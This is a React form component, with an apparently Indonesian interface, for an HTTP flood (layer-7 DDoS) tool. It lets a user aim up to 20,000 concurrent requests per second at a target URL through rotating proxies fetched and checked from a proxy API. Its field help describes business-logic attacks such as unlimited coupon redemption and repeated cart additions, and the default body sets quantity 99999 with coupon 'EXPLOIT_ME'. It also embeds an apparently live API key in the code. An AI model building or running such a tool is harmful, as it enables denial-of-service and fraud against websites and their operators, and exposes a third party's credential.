
"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Slider } from "@/components/ui/slider";
import { Textarea } from "@/components/ui/textarea";
import {
  Select,
  SelectContent,
  SelectGroup,
  SelectItem,
  SelectLabel,
  SelectSeparator,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useState, useTransition, useEffect } from "react";
import { startFloodAttack, fetchProxiesFromUrl, checkProxies, type FloodStats } from "@/app/actions";
import { ProgressDisplay } from "./progress-display";
import { Target, Users, Zap, PlayCircle, StopCircle, ArrowRightLeft, ListPlus, FileText, Timer, ShieldQuestion, Globe, DownloadCloud, Loader2, ListChecks, Server } from "lucide-react";

// Define the interface for attack history entries, can be moved to a shared types file later
interface AttackHistoryEntry {
  id: string;
  dateTime: string;
  targetUrl: string;
  method: string;
  duration: number;
  requestsSent: number;
  successful: number;
  failed: number;
  status: string;
  error?: string;
  statusCodeCounts?: Record<number, number>;
}

const HTTP_METHODS_BASE = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] as const;
const HTTP_METHODS_V1_1 = HTTP_METHODS_BASE.map(method => `HTTP/1.1 ${method}`) as readonly string[];
const ALL_HTTP_METHODS = [...HTTP_METHODS_BASE, ...HTTP_METHODS_V1_1] as const;

const proxyEntryRegex = /^(?:([^:]+:[^@]+@)?)?(?:(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?|[a-zA-Z]{2,6})|(?:\d{1,3}\.){3}\d{1,3})(?::\d{1,5})$/;

const formSchema = z.object({
  targetUrl: z.string().url({ message: "Silakan masukkan URL yang valid (mis., http://contoh.com atau https://contoh.com)." }),
  method: z.enum(ALL_HTTP_METHODS).default("GET"),
  headers: z.string().optional(),
  body: z.string().optional(),
  proxies: z.string().optional().refine(val => {
    if (!val || val.trim() === "") return true; 
    return val.split('\n').filter(line => line.trim() !== "").every(line => {
        const trimmedLine = line.trim();
        if (trimmedLine.startsWith("http://") || trimmedLine.startsWith("https://")) {
            return false;
        }
        return proxyEntryRegex.test(trimmedLine);
    });
  }, { message: "Satu atau lebih entri proksi tidak valid. Gunakan format host:port, IP:PORT, atau user:pass@host:port. Jangan sertakan skema http:// atau https://." }),
  concurrency: z.coerce.number().int().min(1, "Min 1").max(20000, "Maks 20.000").default(50),
  rate: z.coerce.number().int().min(1, "Min 1").max(20000, "Maks 20.000").default(50),
  duration: z.coerce.number().int().min(5, "Min 5d").max(60, "Maks 60d").default(10),
});

type FormValues = z.infer<typeof formSchema>;

const METHODS_WITH_BODY_BASE: readonly string[] = ["POST", "PUT", "PATCH"];
const getBaseMethod = (method: string): string => {
  if (method.startsWith("HTTP/1.1 ")) {
    return method.substring("HTTP/1.1 ".length);
  }
  return method;
};

const MAX_HISTORY_ENTRIES = 5;
const ATTACK_HISTORY_STORAGE_KEY = "flooderL7AttackHistory";

export function RequestCannonForm() {
  const [isFlooding, setIsFlooding] = useState(false);
  const [stats, setStats] = useState<FloodStats | null>(null);
  const [currentError, setCurrentError] = useState<string | null>(null);
  const [isPending, startTransition] = useTransition();
  const { toast } = useToast();

  const [proxyApiUrl, setProxyApiUrl] = useState<string>("https://api.scraperapi.com/?api_key=ce6352d150bdad473a952c0165895c65&url=https%3A%2F%2Fhttpbin.org%2F");
  const [isFetchingProxies, setIsFetchingProxies] = useState<boolean>(false);
  const [isCheckingProxies, setIsCheckingProxies] = useState<boolean>(false);
  const [currentAttackDuration, setCurrentAttackDuration] = useState<number | null>(null);

  const form = useForm<FormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: "",
      method: "GET",
      headers: "",
      body: "",
      proxies: "",
      concurrency: 50,
      rate: 50,
      duration: 10,
    },
  });

  const { setValue } = form;
  const selectedMethod = form.watch("method");
  const currentProxies = form.watch("proxies");

  useEffect(() => {
    const baseMethod = getBaseMethod(selectedMethod);
    let defaultHeaders = '';
    let defaultBody = '';

    const commonHeaders = [
        'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection: keep-alive',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1'
    ].join('\n');

    if (METHODS_WITH_BODY_BASE.includes(baseMethod)) {
        // Headers for methods with a body (POST, PUT, PATCH)
        defaultHeaders = [
            'Content-Type: application/json',
            'Accept: application/json, text/plain, */*',
            commonHeaders
        ].join('\n');
        // Add default body for these methods
        defaultBody = JSON.stringify({
            "productId": "12345",
            "quantity": 99999,
            "couponCode": "EXPLOIT_ME"
        }, null, 2);
    } else {
        // Headers for methods without a body (GET, DELETE, etc.)
        defaultHeaders = [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            commonHeaders
        ].join('\n');
        // Clear body for these methods
        defaultBody = '';
    }
    
    // Set the value in the form
    setValue("headers", defaultHeaders, { shouldValidate: true, shouldDirty: true });
    setValue("body", defaultBody, { shouldValidate: true, shouldDirty: true });

  }, [selectedMethod, setValue]);

  const onSubmit = (values: FormValues) => {
    if (isFlooding && isPending) { 
      toast({ title: "Permintaan Penghentian Banjir", description: "Serangan akan menyelesaikan durasi saat ini di server." });
      return;
    }

    setIsFlooding(true);
    setStats(null);
    setCurrentError(null);
    setCurrentAttackDuration(values.duration);

    startTransition(async () => {
      try {
        const baseMethod = getBaseMethod(values.method);
        const result = await startFloodAttack(
          values.targetUrl,
          values.method,
          values.headers,
          METHODS_WITH_BODY_BASE.includes(baseMethod) ? values.body : undefined,
          values.concurrency,
          values.rate,
          values.duration,
          values.proxies, 
          proxyApiUrl.trim() ? proxyApiUrl.trim() : undefined 
        );
        setStats(result);

        // Save to localStorage
        try {
          const newHistoryEntry: AttackHistoryEntry = {
            id: Date.now().toString(),
            dateTime: new Date().toLocaleString('id-ID', { dateStyle: 'medium', timeStyle: 'medium'}),
            targetUrl: values.targetUrl,
            method: values.method,
            duration: values.duration,
            requestsSent: result.totalSent,
            successful: result.successful,
            failed: result.failed,
            status: result.error ? "Gagal" : "Selesai",
            error: result.error,
            statusCodeCounts: result.statusCodeCounts,
          };

          const existingHistoryString = localStorage.getItem(ATTACK_HISTORY_STORAGE_KEY);
          let history: AttackHistoryEntry[] = [];
          if (existingHistoryString) {
            try {
              history = JSON.parse(existingHistoryString);
              if (!Array.isArray(history)) history = [];
            } catch (e) {
              history = []; // Reset if parsing fails
            }
          }
          history.unshift(newHistoryEntry); // Add to the beginning
          history = history.slice(0, MAX_HISTORY_ENTRIES); // Keep only the N most recent
          localStorage.setItem(ATTACK_HISTORY_STORAGE_KEY, JSON.stringify(history));

        } catch (e) {
          console.error("Failed to save attack history to localStorage:", e);
          // Non-critical error, so we don't need to show a toast for this
        }


        if (result.error) {
          setCurrentError(result.error);
        } else {
          toast({ title: "Banjir Selesai", description: `Mengirim ${result.totalSent} permintaan selama ${values.duration}d. Berhasil: ${result.successful}, Gagal: ${result.failed}.` });
        }
      } catch (error) { 
        let errorMessage = error instanceof Error ? error.message : "Terjadi kesalahan tak terduga.";
        if (errorMessage.includes("An unexpected response was received")) {
            errorMessage = "Server mengalami kesalahan tak terduga, kemungkinan karena kehabisan sumber daya (memori/CPU) akibat pengaturan serangan yang terlalu tinggi. Coba kurangi 'Permintaan Bersamaan' atau 'Tingkat Permintaan'.";
        }
        setCurrentError(errorMessage);
        setStats(prevStats => prevStats && prevStats.error ? prevStats : { totalSent: 0, successful: 0, failed: 0, error: errorMessage });
      } finally {
         setIsFlooding(false); 
         setCurrentAttackDuration(null);
      }
    });
  };

  const handleFetchProxies = async () => {
    if (!proxyApiUrl.trim()) {
      toast({ variant: "destructive", title: "URL API Hilang", description: "Silakan masukkan URL API proksi." });
      return;
    }
    setIsFetchingProxies(true);
    setCurrentError(null); 
    try {
      const result = await fetchProxiesFromUrl(proxyApiUrl); 
      if (result.error) {
        toast({ variant: "destructive", title: "Gagal Mengambil Proksi", description: result.error, duration: 5000 });
      } else if (result.proxies) {
        form.setValue("proxies", result.proxies, { shouldValidate: true });
        toast({ title: "Proksi Diambil", description: `Daftar proksi telah diisi dengan format ip:port. Skema http(s):// otomatis dihapus. Total proksi valid: ${result.proxies.split('\n').filter(p=>p.trim()).length}. Pertimbangkan untuk memeriksanya.` });
      } else {
        toast({ variant: "destructive", title: "Gagal Mengambil Proksi", description: "Tidak menerima proksi atau respons tidak terduga.", duration: 5000 });
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "Terjadi kesalahan tak terduga.";
      toast({ variant: "destructive", title: "Kesalahan Mengambil Proksi", description: errorMessage, duration: 5000 });
    } finally {
      setIsFetchingProxies(false);
    }
  };

  const handleCheckProxies = async () => {
    const proxiesToTest = form.getValues("proxies");
    if (!proxiesToTest || !proxiesToTest.trim()) {
      toast({ variant: "destructive", title: "Tidak Ada Proksi", description: "Daftar proksi kosong. Tidak ada yang perlu diperiksa." });
      return;
    }
    if (proxiesToTest.split('\n').some(line => line.trim().startsWith("http://") || line.trim().startsWith("https://"))) {
        toast({ variant: "destructive", title: "Format Proksi Tidak Valid", description: "Daftar proksi tidak boleh mengandung skema http:// atau https://. Harap hapus sebelum memeriksa.", duration: 7000});
        return;
    }

    setIsCheckingProxies(true);
    setCurrentError(null); 
    toast({ title: "Memeriksa Proksi", description: "Ini mungkin memerlukan beberapa saat tergantung pada jumlah proksi..." });
    try {
      const result = await checkProxies(proxiesToTest); 
      if (result.error && result.totalChecked === 0 && !result.liveCount) { 
         toast({ variant: "destructive", title: "Kesalahan Pemeriksaan Proksi", description: result.error, duration: 5000 });
      } else if (result.error) { 
        toast({ variant: "destructive", title: "Peringatan Pemeriksaan Proksi", description: result.error, duration: 5000 });
      } else {
        form.setValue("proxies", result.liveProxiesString, { shouldValidate: true });
        toast({
          title: "Pemeriksaan Proksi Selesai",
          description: `Memeriksa ${result.totalChecked} proksi. Ditemukan ${result.liveCount} hidup. ${result.deadCount} tidak responsif atau tidak valid dan telah dihapus. Daftar proksi diperbarui.`,
          duration: 7000,
        });
      }
    } catch (error) {
      const errorMessage = error instanceof Error ? error.message : "Terjadi kesalahan tak terduga selama pemeriksaan proksi.";
      toast({ variant: "destructive", title: "Kesalahan Memeriksa Proksi", description: errorMessage, duration: 5000 });
    } finally {
      setIsCheckingProxies(false);
    }
  };

  const isAnyOperationActive = isPending || isFetchingProxies || isCheckingProxies;
  const showBodyField = METHODS_WITH_BODY_BASE.includes(getBaseMethod(selectedMethod));


  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-8">
        <FormField
          control={form.control}
          name="targetUrl"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Target className="mr-2 h-4 w-4" />URL Target</FormLabel>
              <FormControl>
                <Input placeholder="https://contoh.com" {...field} disabled={isAnyOperationActive} />
              </FormControl>
              <FormDescription>
                Untuk serangan logika bisnis, ini harus berupa endpoint API spesifik. Anda dapat menyertakan port kustom dalam URL (misalnya, `http://contoh.com:8080`).
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="method"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Server className="mr-2 h-4 w-4" />Metode HTTP &amp; Versi</FormLabel>
              <Select onValueChange={field.onChange} defaultValue={field.value} disabled={isAnyOperationActive}>
                <FormControl>
                  <SelectTrigger>
                    <SelectValue placeholder="Pilih metode &amp; versi HTTP" />
                  </SelectTrigger>
                </FormControl>
                <SelectContent>
                  <SelectGroup>
                    <SelectLabel>HTTP (Versi Otomatis)</SelectLabel>
                    {HTTP_METHODS_BASE.map((method) => (
                      <SelectItem key={method} value={method}>{method}</SelectItem>
                    ))}
                  </SelectGroup>
                  <SelectSeparator />
                  <SelectGroup>
                    <SelectLabel>HTTP/1.1 (Coba Paksa)</SelectLabel>
                    {HTTP_METHODS_V1_1.map((method) => (
                      <SelectItem key={method} value={method}>{method}</SelectItem>
                    ))}
                  </SelectGroup>
                </SelectContent>
              </Select>
              <FormDescription>
                Pilih metode HTTP. Serangan akan dikirim menggunakan HTTPS jika URL target dimulai dengan `https://`. Opsi 'HTTP/1.1' akan mencoba memaksa koneksi HTTP/1.1 (bahkan melalui HTTPS), yang berguna untuk menguji server yang mungkin memiliki kerentanan pada protokol yang lebih lama.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="headers"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><ListPlus className="mr-2 h-4 w-4" />Header Kustom (Otomatis)</FormLabel>
              <FormControl>
                <Textarea
                  placeholder="Content-Type: application/json
Authorization: Bearer token
User-Agent: MyCustomAgent/1.0"
                  className="resize-y"
                  {...field}
                  disabled={isAnyOperationActive}
                />
              </FormControl>
              <FormDescription>
                Header dibuat secara otomatis berdasarkan Metode HTTP yang dipilih. Anda dapat mengeditnya jika perlu. Untuk serangan logika bisnis, header penting mungkin termasuk `Authorization` atau `Cookie`. Jika User-Agent tidak ditentukan, agen pengguna acak akan dipilih dari daftar internal.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        {showBodyField && (
          <FormField
            control={form.control}
            name="body"
            render={({ field }) => (
              <FormItem>
                <FormLabel className="flex items-center"><FileText className="mr-2 h-4 w-4" />Isi Permintaan (Otomatis untuk {getBaseMethod(selectedMethod)})</FormLabel>
                <FormControl>
                  <Textarea
                    placeholder='{"kunci": "nilai"}'
                    className="resize-y"
                    {...field}
                    disabled={isAnyOperationActive}
                  />
                </FormControl>
                <FormDescription>
                    Isi permintaan ini dibuat secara otomatis. Ini adalah tempat Anda membuat payload untuk serangan logika bisnis. Contoh: JSON untuk menambahkan item ke keranjang berulang kali, atau permintaan untuk menebus kupon tanpa batas.
                </FormDescription>
                <FormMessage />
              </FormItem>
            )}
          />
        )}
        
        <div className="space-y-2">
            <FormLabel className="flex items-center"><Globe className="mr-2 h-4 w-4 text-primary" />URL API Proksi (Opsional - Untuk Pembaruan Dinamis)</FormLabel>
            <Input
                placeholder="https://api.scraperapi.com/?api_key=..."
                value={proxyApiUrl}
                onChange={(e) => setProxyApiUrl(e.target.value)}
                disabled={isAnyOperationActive}
                className="flex-grow"
                aria-label="URL API Proksi"
            />
            <FormDescription>
            Masukkan URL yang mengembalikan daftar proksi teks biasa (satu per baris, format: IP:PORT atau host:port). Skema http(s):// akan otomatis dihapus. Jika diisi, alat akan mencoba mengambil proksi dari URL ini di awal dan setiap 5 detik selama serangan untuk memperbarui daftar proksi secara dinamis. Tombol "Ambil Proksi" di bawah mengisi kolom "Daftar Proksi" secara manual.
            </FormDescription>
        </div>

        <FormField
          control={form.control}
          name="proxies"
          render={({ field }) => (
            <FormItem>
              <FormLabel className="flex items-center"><ShieldQuestion className="mr-2 h-4 w-4" />Daftar Proksi (Opsional - Statis/Fallback)</FormLabel>
              <FormControl>
                <Textarea
                  placeholder="user:pass@host1.com:port
123.45.67.89:8080
proxy.example.com:3128"
                  className="resize-y h-24"
                  {...field}
                  disabled={isAnyOperationActive}
                  aria-label="Daftar Proksi"
                />
              </FormControl>
              <FormDescription>
                Masukkan satu proksi per baris dalam format ip:port, host:port, atau user:pass@host:port. Jangan sertakan skema http:// atau https://. Daftar ini digunakan jika URL API Proksi di atas tidak diisi, atau sebagai fallback jika pengambilan awal dari API gagal. Daftar ini tidak diperbarui secara dinamis selama serangan.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />
        <div className="flex flex-col sm:flex-row gap-2">
            <Button
                type="button"
                onClick={handleFetchProxies}
                disabled={isAnyOperationActive || !proxyApiUrl.trim()}
                variant="outline"
                className="w-full sm:flex-1"
            >
                {isFetchingProxies ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <DownloadCloud className="mr-2 h-4 w-4" />}
                Ambil Proksi (Isi ke Daftar Statis)
            </Button>
            <Button
                type="button"
                onClick={handleCheckProxies}
                disabled={isAnyOperationActive || !currentProxies?.trim()}
                variant="outline"
                className="w-full sm:flex-1"
            >
                {isCheckingProxies ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <ListChecks className="mr-2 h-4 w-4" />}
                Periksa Proksi (Dari Daftar Statis)
            </Button>
        </div>


        <FormField
          control={form.control}
          name="concurrency"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Users className="mr-2 h-4 w-4" />Permintaan Bersamaan: {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={1}
                  max={20000}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAnyOperationActive}
                  aria-label="Permintaan Bersamaan"
                  {...restField}
                />
              </FormControl>
               <FormDescription>
                Jumlah maksimum permintaan yang diizinkan untuk berjalan secara paralel. Pengaturan yang sangat tinggi dapat menyebabkan ketidakstabilan sistem.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="rate"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Zap className="mr-2 h-4 w-4" />Tingkat Permintaan (RPS): {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={1}
                  max={20000}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAnyOperationActive}
                  aria-label="Tingkat Permintaan"
                  {...restField}
                />
              </FormControl>
              <FormDescription>
                Jumlah permintaan yang ditargetkan untuk dikirim per detik. Tingkat pengiriman aktual mungkin dibatasi oleh sumber daya server dan latensi jaringan.
              </FormDescription>
              <FormMessage />
            </FormItem>
          )}
        />

        <FormField
          control={form.control}
          name="duration"
          render={({ field: { onChange, value, ...restField } }) => (
            <FormItem>
              <FormLabel className="flex items-center"><Timer className="mr-2 h-4 w-4" />Durasi Serangan (detik): {value}</FormLabel>
              <FormControl>
                <Slider
                  defaultValue={[value]}
                  min={5}
                  max={60}
                  step={1}
                  onValueChange={(vals) => onChange(vals[0])}
                  disabled={isAnyOperationActive}
                  aria-label="Durasi Serangan"
                  {...restField}
                />
              </FormControl>
              <FormMessage />
            </FormItem>
          )}
        />
        
        <Button 
          type="submit" 
          className="w-full" 
          disabled={isAnyOperationActive}
          variant={isPending ? "destructive" : "default"} 
        >
          {isPending ? <StopCircle className="mr-2 h-4 w-4 animate-pulse" /> : <PlayCircle className="mr-2 h-4 w-4" />}
          {isPending ? "Serangan Sedang Berlangsung..." : "Mulai Serangan"}
        </Button>
      </form>

      {(isPending || stats || currentError) && ( 
        <div className="mt-8">
          <ProgressDisplay
            isLoading={isPending}
            stats={stats}
            error={currentError /* This is form-level error */}
            attackDuration={currentAttackDuration}
          />
        </div>
      )}
    </Form>
  );
}
